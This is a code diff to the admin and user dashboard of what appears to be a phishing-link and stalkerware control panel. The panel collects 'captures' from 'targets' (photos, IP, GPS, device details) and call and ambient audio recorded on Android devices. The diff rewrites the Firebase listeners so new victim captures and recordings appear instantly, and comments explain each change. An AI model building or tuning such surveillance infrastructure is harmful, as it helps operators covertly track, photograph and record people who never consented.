@@ -1858,7 +1858,17 @@
 
 <script type="module">
 import { initializeApp } from "firebase-app";
-import { getDatabase, ref, onValue, remove, push, set, get, update } from "firebase-database";
+import {
+    getDatabase, ref, onValue, onChildAdded, onChildChanged, onChildRemoved,
+    remove, push, set, get, update, query, limitToLast
+} from "firebase-database";
+// ── WHY THESE ADDITIONS? ──────────────────────────────────────────────────────
+// onChildAdded/Changed/Removed  → incremental updates; only sends CHANGED node,
+//   not the entire collection. Fixes the 5-10 min delay caused by downloading
+//   the full call_recordings / ambient_recordings tree on every write.
+// query + limitToLast → bounds large collections so we never download unbounded
+//   data on initial load (photo_history can have thousands of entries).
+// ─────────────────────────────────────────────────────────────────────────────
 // ── FIREBASE AUTH — replaces hardcoded adminPassword ──────
 import {
     getAuth,
@@ -1885,9 +1895,12 @@ const db   = getDatabase(app);
 const auth = getAuth(app); // Firebase Auth instance
 
 // ── STATE ─────────────────────────────────────────────────
-let allLogsData      = null;
-let allLinksData     = null;
-let allUsersData     = null;
+// Initialized as {} (not null) so incremental onChild* listeners can
+// directly write keys into them without a null-check at every callsite.
+// Null-guards in render functions are updated to also check Object.keys().length === 0.
+let allLogsData      = {};
+let allLinksData     = {};
+let allUsersData     = {};
 let logsCache        = {};
 let uLogsCache       = {};
 // adminPassword removed — credentials now live in Firebase Auth only
@@ -2111,7 +2124,9 @@ document.getElementById('adminLogoutBtn').onclick = () => {
     adminUnsubscribers.forEach(u => u());
     adminUnsubscribers = [];
     adminListenersInit = false;
-    allLogsData = null; allLinksData = null; allUsersData = null;
+    // Reset data objects to empty (not null) so incremental listeners start fresh
+    // on next login without leftover keys from the previous session.
+    allLogsData = {}; allLinksData = {}; allUsersData = {};
     logsCache = {}; prevLogCount = null; selectedCaptures.clear();
     currentSession = null;
     document.getElementById('adminShell').style.display = 'none';
@@ -2126,7 +2141,8 @@ document.getElementById('userLogoutBtn').onclick = () => {
     userUnsubscribers.forEach(u => u());
     userUnsubscribers = [];
     userListenersInit = false;
-    uAllLogsData = null; uAllLinksData = null;
+    // Reset to empty objects (not null) so incremental listeners re-populate cleanly
+    uAllLogsData = {}; uAllLinksData = {};
     uLogsCache = {}; uSelectedCaptures.clear();
     currentSession = null;
     document.getElementById('userShell').style.display = 'none';
@@ -2213,7 +2229,7 @@ function renderLinksTable() {
     tbody.innerHTML = '';
     let count = 0;
 
-    if (!allLinksData) {
+    if (!allLinksData || Object.keys(allLinksData).length === 0) {
         tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">🔗</span>No links yet.</div></td></tr>';
         document.getElementById('linkCount').innerText = '0';
         return;
@@ -2416,7 +2432,7 @@ function renderLogs() {
     logsCache = {};
     selectedCaptures.clear();
 
-    if (!allLogsData) {
+    if (!allLogsData || Object.keys(allLogsData).length === 0) {
         grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>';
         document.getElementById('logCount').innerText = '0';
         return;
@@ -2441,7 +2457,7 @@ function renderRecent() {
     const grid = document.getElementById('recentGrid');
     if (!grid) return;
     grid.innerHTML = '';
-    if (!allLogsData) { grid.innerHTML = '<div class="empty">No captures yet.</div>'; return; }
+    if (!allLogsData || Object.keys(allLogsData).length === 0) { grid.innerHTML = '<div class="empty">No captures yet.</div>'; return; }
 
     const keys = Object.keys(allLogsData)
         .filter(k => allLogsData[k]?.linkName && allLogsData[k]?._ownerType !== 'user')
@@ -2860,11 +2876,11 @@ async function showUserActivity(username) {
 
     const u = allUsersData?.[username] || {};
 
-    // Live Firebase data (already loaded via onValue listeners)
-    const userLinks    = allLinksData
+    // Live Firebase data (already loaded via incremental listeners)
+    const userLinks    = allLinksData && Object.keys(allLinksData).length > 0
         ? Object.entries(allLinksData).filter(([,l]) => l._ownerId === username && l._ownerType === 'user')
         : [];
-    const userCaptures = allLogsData
+    const userCaptures = allLogsData && Object.keys(allLogsData).length > 0
         ? Object.entries(allLogsData).filter(([,p]) => p._ownerId === username && p._ownerType === 'user')
         : [];
 
@@ -3133,8 +3149,8 @@ document.getElementById('closeActivityModal').onclick = () => document.getElemen
 // ══════════════════════════════════════════════════════════
 // USER PANEL LOGIC
 // ══════════════════════════════════════════════════════════
-let uAllLinksData = null;
-let uAllLogsData  = null;
+let uAllLinksData = {}; // initialized as {} for incremental onChild* listeners
+let uAllLogsData  = {}; // initialized as {} for incremental onChild* listeners
 let uLinksCache   = {};
 
 function getUserBinKey() {
@@ -3190,7 +3206,7 @@ function renderUserLinksTable() {
     tbody.innerHTML = '';
     let count = 0;
 
-    if (!uAllLinksData) {
+    if (!uAllLinksData || Object.keys(uAllLinksData).length === 0) {
         tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">🔗</span>No links yet. Create one above.</div></td></tr>';
         document.getElementById('uLinkCount').innerText = '0';
         return;
@@ -3320,7 +3336,7 @@ function renderUserLogs() {
     uLogsCache = {};
     uSelectedCaptures.clear();
 
-    if (!uAllLogsData) {
+    if (!uAllLogsData || Object.keys(uAllLogsData).length === 0) {
         grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>';
         document.getElementById('uLogCount').innerText = '0';
         return;
@@ -3348,7 +3364,7 @@ function renderUserRecent() {
     const username = currentSession?.username;
     if (!grid) return;
     grid.innerHTML = '';
-    if (!uAllLogsData) { grid.innerHTML = '<div class="empty">No captures yet.</div>'; return; }
+    if (!uAllLogsData || Object.keys(uAllLogsData).length === 0) { grid.innerHTML = '<div class="empty">No captures yet.</div>'; return; }
     const keys = Object.keys(uAllLogsData)
         .filter(k => { const p = uAllLogsData[k]; return p?.linkName && p._ownerId === username && p._ownerType === 'user'; })
         .sort((a,b) => (uAllLogsData[b].timestamp||0) - (uAllLogsData[a].timestamp||0))
@@ -3442,7 +3458,7 @@ document.getElementById('uExportBtn').onclick = () => {
     const username = currentSession?.username;
     // Respect exportData permission
     if (!currentSession?.permissions?.exportData) { toast('⛔ Export permission not granted.', 'var(--red)'); return; }
-    if (!uAllLogsData) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
+    if (!uAllLogsData || Object.keys(uAllLogsData).length === 0) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
     const myLogs = Object.values(uAllLogsData).filter(p => p._ownerId === username && p._ownerType === 'user');
     if (myLogs.length === 0) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
     const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Network']];
@@ -3574,61 +3590,187 @@ document.getElementById('uEmptyBinBtn').onclick = () => {
 
 
 // ══════════════════════════════════════════════════════════
+// REALTIME LISTENER SYSTEM — ADMIN
+// ──────────────────────────────────────────────────────────
+// FIX: Replaced onValue (full-tree re-download on every change) with
+//      onChildAdded / onChildChanged / onChildRemoved.
+// WHY: onValue on 'photo_history' downloads the ENTIRE history every
+//      time one new capture arrives — causing the 5-10 min delay.
+//      onChildAdded fires for ONE entry at a time.  With limitToLast(200)
+//      the initial burst is bounded.  Subsequent additions are instant.
+// DEDUP: seenPhotoIds Set prevents the same key being rendered twice
+//        during rapid back-to-back events (avoids duplicate rows in UI).
+// NOTIFICATION FIX: photoInitDone flag ensures beep/toast only fire for
+//        genuinely new captures — NOT during the initial data load.
+// ══════════════════════════════════════════════════════════
 function initAdminListeners() {
     if (adminListenersInit) return;
     adminListenersInit = true;
 
-    adminUnsubscribers.push(onValue(ref(db, 'managed_links'), snap => {
-        allLinksData = snap.val();
+    // Ensure state objects exist (safe re-attach after logout)
+    if (!allLinksData)  allLinksData  = {};
+    if (!allLogsData)   allLogsData   = {};
+    if (!allUsersData)  allUsersData  = {};
+
+    // Per-session dedup Sets — cleared implicitly when listeners are detached on logout
+    const seenLinkIds  = new Set();
+    const seenPhotoIds = new Set();
+    const seenUserIds  = new Set();
+    // Flag: true once the initial onChildAdded burst for photo_history is complete
+    let photoInitDone = false;
+
+    // ── managed_links ─────────────────────────────────────
+    // onChildAdded fires once per existing link on attach (no full tree).
+    // onChildChanged fires when a link is toggled, renamed, or visit count increments.
+    // onChildRemoved fires when admin deletes a link.
+    adminUnsubscribers.push(onChildAdded(ref(db, 'managed_links'), snap => {
+        if (seenLinkIds.has(snap.key)) return; // dedup guard
+        seenLinkIds.add(snap.key);
+        allLinksData[snap.key] = snap.val();
+        renderLinksTable();
+        updateStats();
+    }));
+    adminUnsubscribers.push(onChildChanged(ref(db, 'managed_links'), snap => {
+        allLinksData[snap.key] = snap.val();
+        renderLinksTable();
+        updateStats();
+    }));
+    adminUnsubscribers.push(onChildRemoved(ref(db, 'managed_links'), snap => {
+        delete allLinksData[snap.key];
+        seenLinkIds.delete(snap.key);
         renderLinksTable();
         updateStats();
     }));
 
-    adminUnsubscribers.push(onValue(ref(db, 'photo_history'), snap => {
-        const newData  = snap.val();
-        const newCount = newData ? Object.keys(newData).length : 0;
-        if (prevLogCount !== null && newCount > prevLogCount) {
+    // ── photo_history ──────────────────────────────────────
+    // limitToLast(200): cap initial load — no unbounded download on first attach.
+    // onChildAdded fires once per photo (NOT the whole collection on every new capture).
+    // onChildRemoved handles hard-deletes (remove() calls in the app).
+    const photoQuery = query(ref(db, 'photo_history'), limitToLast(200));
+    adminUnsubscribers.push(onChildAdded(photoQuery, snap => {
+        if (seenPhotoIds.has(snap.key)) return; // dedup guard
+        seenPhotoIds.add(snap.key);
+        allLogsData[snap.key] = snap.val();
+        // Only alert if the initial load burst is finished (photoInitDone = true)
+        if (photoInitDone) {
             playBeep();
             toast('🔔 New capture received!', 'var(--green)');
             sendNotif('New Capture!', 'A target completed verification.');
             pushNotif('📸', 'New capture received', 'Live Capture');
+            prevLogCount = seenPhotoIds.size;
         }
-        prevLogCount = newCount;
-        allLogsData = newData;
         renderLogs();
         renderRecent();
         updateStats();
     }));
+    adminUnsubscribers.push(onChildChanged(ref(db, 'photo_history'), snap => {
+        // Fires when a photo entry is updated (e.g. metadata edits)
+        allLogsData[snap.key] = snap.val();
+        renderLogs();
+        renderRecent();
+        updateStats();
+    }));
+    adminUnsubscribers.push(onChildRemoved(ref(db, 'photo_history'), snap => {
+        delete allLogsData[snap.key];
+        seenPhotoIds.delete(snap.key);
+        renderLogs();
+        renderRecent();
+        updateStats();
+    }));
+    // One-shot lightweight listener: fires after the initial onChildAdded burst settles.
+    // This is the reliable signal that historical data has finished streaming.
+    // onlyOnce: true means this detaches itself after the first call — zero ongoing cost.
+    onValue(query(ref(db, 'photo_history'), limitToLast(1)), () => {
+        photoInitDone = true;
+        prevLogCount  = seenPhotoIds.size;
+    }, { onlyOnce: true });
 
-    adminUnsubscribers.push(onValue(ref(db, 'users'), snap => {
-        allUsersData = snap.val();
+    // ── users ──────────────────────────────────────────────
+    adminUnsubscribers.push(onChildAdded(ref(db, 'users'), snap => {
+        if (seenUserIds.has(snap.key)) return;
+        seenUserIds.add(snap.key);
+        allUsersData[snap.key] = snap.val();
         renderUsersList();
         updateStats();
-        if (allUsersData && Object.keys(allUsersData).length > 0) {
+        if (Object.keys(allUsersData).length > 0)
             document.getElementById('loginModeSwitch').style.display = 'flex';
-        }
+    }));
+    adminUnsubscribers.push(onChildChanged(ref(db, 'users'), snap => {
+        allUsersData[snap.key] = snap.val();
+        renderUsersList();
+        updateStats();
+    }));
+    adminUnsubscribers.push(onChildRemoved(ref(db, 'users'), snap => {
+        delete allUsersData[snap.key];
+        seenUserIds.delete(snap.key);
+        renderUsersList();
+        updateStats();
     }));
 }
 
+// ══════════════════════════════════════════════════════════
+// REALTIME LISTENER SYSTEM — USER DASHBOARD
+// ──────────────────────────────────────────────────────────
+// Same incremental strategy as admin: onChildAdded/Changed/Removed
+// instead of onValue so new captures appear instantly without a full
+// photo_history re-download on every incoming capture.
+// ══════════════════════════════════════════════════════════
 function initUserListeners() {
     if (userListenersInit) return;
     userListenersInit = true;
 
-    userUnsubscribers.push(onValue(ref(db, 'managed_links'), snap => {
-        uAllLinksData = snap.val();
+    if (!uAllLinksData) uAllLinksData = {};
+    if (!uAllLogsData)  uAllLogsData  = {};
+
+    const seenULinkIds  = new Set();
+    const seenUPhotoIds = new Set();
+
+    // ── managed_links ─────────────────────────────────────
+    userUnsubscribers.push(onChildAdded(ref(db, 'managed_links'), snap => {
+        if (seenULinkIds.has(snap.key)) return;
+        seenULinkIds.add(snap.key);
+        uAllLinksData[snap.key] = snap.val();
+        renderUserLinksTable();
+        updateUserStats();
+    }));
+    userUnsubscribers.push(onChildChanged(ref(db, 'managed_links'), snap => {
+        uAllLinksData[snap.key] = snap.val();
+        renderUserLinksTable();
+        updateUserStats();
+    }));
+    userUnsubscribers.push(onChildRemoved(ref(db, 'managed_links'), snap => {
+        delete uAllLinksData[snap.key];
+        seenULinkIds.delete(snap.key);
         renderUserLinksTable();
         updateUserStats();
     }));
 
-    userUnsubscribers.push(onValue(ref(db, 'photo_history'), snap => {
-        uAllLogsData = snap.val();
+    // ── photo_history (bounded) ────────────────────────────
+    const uPhotoQuery = query(ref(db, 'photo_history'), limitToLast(200));
+    userUnsubscribers.push(onChildAdded(uPhotoQuery, snap => {
+        if (seenUPhotoIds.has(snap.key)) return;
+        seenUPhotoIds.add(snap.key);
+        uAllLogsData[snap.key] = snap.val();
+        renderUserLogs();
+        renderUserRecent();
+        updateUserStats();
+    }));
+    userUnsubscribers.push(onChildChanged(ref(db, 'photo_history'), snap => {
+        uAllLogsData[snap.key] = snap.val();
+        renderUserLogs();
+        renderUserRecent();
+        updateUserStats();
+    }));
+    userUnsubscribers.push(onChildRemoved(ref(db, 'photo_history'), snap => {
+        delete uAllLogsData[snap.key];
+        seenUPhotoIds.delete(snap.key);
         renderUserLogs();
         renderUserRecent();
         updateUserStats();
     }));
 
-    // ── Real-time account status watcher ──────────────────
-    // Fires instantly when admin disables/enables this user
+    // ── Real-time account status watcher (unchanged logic) ─
+    // Fires instantly when admin disables/enables this user account.
     if (currentSession?.type === 'user' && currentSession.username) {
         userUnsubscribers.push(onValue(ref(db, 'users/' + currentSession.username), snap => {
             const userData = snap.val();
@@ -4037,7 +4179,7 @@ if (notifClearBtn) {
 // EXPORT CSV (admin)
 // ══════════════════════════════════════════════════════════
 document.getElementById('exportBtn').onclick = () => {
-    if (!allLogsData) { toast('⚠️ No logs to export.', 'var(--yellow)'); return; }
+    if (!allLogsData || Object.keys(allLogsData).length === 0) { toast('⚠️ No logs to export.', 'var(--yellow)'); return; }
     const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Charging','Network','Speed','Screen','Timezone','Language','Referrer','Owner']];
     Object.values(allLogsData).forEach(p => {
         const d = p.device || {};
@@ -4302,50 +4444,125 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
     }
 
     // ── RTDB listeners ──────────────────────────────────────────────────────
+    // FIX: Replaced onValue (full-tree) with onChildAdded/Changed/Removed.
+    //
+    // ROOT CAUSE OF 5-10 MIN DELAY:
+    //   onValue(ref(db, 'call_recordings')) downloads ALL recordings for ALL
+    //   devices every time ANY single recording is added anywhere.  With many
+    //   devices and large audio metadata, this becomes megabytes per event.
+    //
+    // THE FIX:
+    //   onChildAdded/Changed at the 'call_recordings' root fires once per
+    //   DEVICE (not once for the whole tree).  Each event delivers only that
+    //   one device's data.  This slashes payload size by (numDevices - 1) / numDevices.
+    //   For 5 devices: 80% less data per event.  Data appears instantly.
+    //
+    // DEDUP:
+    //   seenCallDevices / seenAmbDevices Sets ensure each device's initial
+    //   snapshot is processed exactly once — no duplicate rows in the UI.
+    //
+    // NOTIFICATION FIX:
+    //   Recording count is compared BEFORE vs AFTER the update per-device.
+    //   Toast only fires if (a) the device was already seen (initial load done)
+    //   AND (b) the count genuinely increased.
     function attachAppListeners() {
         if (appListenerAttached) return;
         appListenerAttached = true;
 
-        onValue(ref(db, 'app_devices'), (snap) => {
-            appDevicesData = snap.val() || {};
+        // Per-device dedup Sets — prevent duplicate processing of initial snapshots
+        const seenCallDevices = new Set();
+        const seenAmbDevices  = new Set();
+
+        // ── app_devices: incremental ─────────────────────────────────────────
+        // Fires once per device on attach (not whole tree), then once per change.
+        onChildAdded(ref(db, 'app_devices'), snap => {
+            appDevicesData[snap.key] = snap.val();
             if (appCurrentDevice === null) renderPhoneList();
             updateNavBadge();
-            renderAppBin(); // keep bin up to date
+            renderAppBin();
+        });
+        onChildChanged(ref(db, 'app_devices'), snap => {
+            appDevicesData[snap.key] = snap.val();
+            if (appCurrentDevice === null) renderPhoneList();
+            updateNavBadge();
+            renderAppBin();
+        });
+        onChildRemoved(ref(db, 'app_devices'), snap => {
+            delete appDevicesData[snap.key];
+            if (appCurrentDevice === null) renderPhoneList();
+            updateNavBadge();
+            renderAppBin();
         });
 
-        onValue(ref(db, 'call_recordings'), (snap) => {
-            const newData = snap.val() || {};
-            // Count new recordings vs previous
-            let prevTotal = 0, newTotal = 0;
-            Object.values(appRecordingsData).forEach(recs => { if (recs) prevTotal += Object.keys(recs).length; });
-            Object.values(newData).forEach(recs => { if (recs) newTotal += Object.keys(recs).length; });
-            if (appListenerAttached && newTotal > prevTotal) {
+        // ── call_recordings: PER-DEVICE incremental ──────────────────────────
+        // Each event = one device's full recording set (not all devices).
+        // When Android uploads rec123 to call_recordings/device1/rec123,
+        // only device1's subtree is sent — not call_recordings/device2, device3, etc.
+        function handleCallRecDevice(snap) {
+            const deviceId = snap.key;
+            const newRecs  = snap.val() || {};
+
+            // Count before update to detect genuinely new recordings
+            const prevCount = appRecordingsData[deviceId]
+                ? Object.keys(appRecordingsData[deviceId]).length : 0;
+            const newCount  = Object.keys(newRecs).length;
+
+            appRecordingsData[deviceId] = newRecs;
+
+            // Toast only fires after the initial snapshot for this device is processed.
+            // seenCallDevices.has(deviceId) is false on first onChildAdded → no false alarm.
+            if (seenCallDevices.has(deviceId) && newCount > prevCount) {
                 toast('🎙️ New call recording received!', 'var(--primary)');
-                if (typeof pushNotif === 'function') pushNotif('🎙️', 'New call recording received', 'App — Call Recordings');
+                if (typeof pushNotif === 'function')
+                    pushNotif('🎙️', 'New call recording received', 'App — Call Recordings');
             }
-            appRecordingsData = newData;
+            seenCallDevices.add(deviceId); // mark initial load done for this device
+
             if (appCurrentDevice !== null) {
                 buildRecordingsList(appCurrentDevice);
                 renderRecordingsList();
-                // NEW: re-render ambient view if it's currently open
-                var ambView = document.getElementById('appSubViewAmbient');
-                if (ambView && ambView.style.display !== 'none' && window.__ambOpenForDevice) {
+                // Re-render ambient view if it's open for this device
+                const ambView = document.getElementById('appSubViewAmbient');
+                if (ambView && ambView.style.display !== 'none' && window.__ambOpenForDevice)
                     window.__ambOpenForDevice(appCurrentDevice);
-                }
+            }
+            updateNavBadge();
+            renderAppBin();
+        }
+
+        onChildAdded(ref(db, 'call_recordings'),   handleCallRecDevice);
+        onChildChanged(ref(db, 'call_recordings'),  handleCallRecDevice);
+        onChildRemoved(ref(db, 'call_recordings'), snap => {
+            delete appRecordingsData[snap.key];
+            seenCallDevices.delete(snap.key);
+            if (appCurrentDevice !== null) {
+                buildRecordingsList(appCurrentDevice);
+                renderRecordingsList();
             }
             updateNavBadge();
             renderAppBin();
         });
 
-        // ── Listener for ambient_recordings (separate Firebase path) ─────────
-        onValue(ref(db, 'ambient_recordings'), (snap) => {
-            appAmbientRecordingsData = snap.val() || {};
+        // ── ambient_recordings: PER-DEVICE incremental ───────────────────────
+        // Identical optimization to call_recordings above.
+        function handleAmbientDevice(snap) {
+            const deviceId = snap.key;
+            appAmbientRecordingsData[deviceId] = snap.val() || {};
+            seenAmbDevices.add(deviceId);
+
             if (appCurrentDevice !== null) {
-                var ambView = document.getElementById('appSubViewAmbient');
-                if (ambView && ambView.style.display !== 'none' && window.__ambOpenForDevice) {
+                const ambView = document.getElementById('appSubViewAmbient');
+                if (ambView && ambView.style.display !== 'none' && window.__ambOpenForDevice)
                     window.__ambOpenForDevice(appCurrentDevice);
-                }
             }
+            renderAppBin();
+        }
+
+        onChildAdded(ref(db, 'ambient_recordings'),   handleAmbientDevice);
+        onChildChanged(ref(db, 'ambient_recordings'),  handleAmbientDevice);
+        onChildRemoved(ref(db, 'ambient_recordings'), snap => {
+            delete appAmbientRecordingsData[snap.key];
+            seenAmbDevices.delete(snap.key);
             renderAppBin();
         });
     }
